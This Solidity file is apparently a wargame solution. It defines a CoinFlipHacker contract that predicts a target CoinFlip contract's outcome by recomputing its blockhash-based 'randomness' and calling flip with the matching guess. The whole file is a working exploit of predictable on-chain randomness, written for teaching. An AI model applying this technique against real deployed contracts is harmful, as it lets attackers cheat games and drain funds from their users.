// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./06_CoinFlip.sol";

contract CoinFlipHacker {
    CoinFlip coinFlip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlip) {
        coinFlip = CoinFlip(_coinFlip);
    }

    // 通过模拟CoinFlip中的side计算逻辑，来调用flip
    function hack() public returns (bool) {
        uint256 _blockValue = uint256(blockhash(block.number - 1));
        uint256 _coinFlip = _blockValue / FACTOR;
        bool _side = _coinFlip == 1 ? true : false;
        return coinFlip.flip(_side);
    }
}